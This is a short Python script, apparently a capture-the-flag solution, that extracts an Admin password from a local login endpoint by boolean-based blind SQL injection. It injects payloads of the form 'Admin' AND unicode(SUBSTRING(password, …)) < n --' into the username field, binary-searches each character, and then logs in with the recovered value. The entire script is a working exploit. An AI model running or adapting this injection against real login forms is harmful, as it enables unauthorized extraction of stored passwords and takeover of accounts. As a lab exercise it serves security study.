import requests

FLAG_LENGTH = 38

URL = "http://127.0.0.1:5000"


def login(username, password):
    res = requests.post(
        f"{URL}/login", data={"username": username, "password": password})
    return res, res.text


def try_payload(payload):
    _, text = login(payload, "")
    return "Logged in!" in text


def gen_payload(index, num):
    return f"Admin' AND unicode(SUBSTRING(password, {index+1}, 1)) < {num} --"


MIN_NUM = ord("!")
MAX_NUM = ord("~")

num_requests = 0
flag = ""
for i in range(FLAG_LENGTH):
    min_num = MIN_NUM
    max_num = MAX_NUM
    while True:
        attempt_num = (min_num + max_num) // 2
        payload = gen_payload(i, attempt_num)
        num_requests += 1
        is_success = try_payload(payload)
        if is_success:
            max_num = (min_num + max_num) // 2
        else:
            min_num = (min_num + max_num) // 2
        if max_num - min_num <= 1:
            if is_success:
                flag += chr(min_num)
            else:
                flag += chr(attempt_num)
            print(flag)
            break

print(login("Admin", flag))
print("Number of requests:", num_requests)
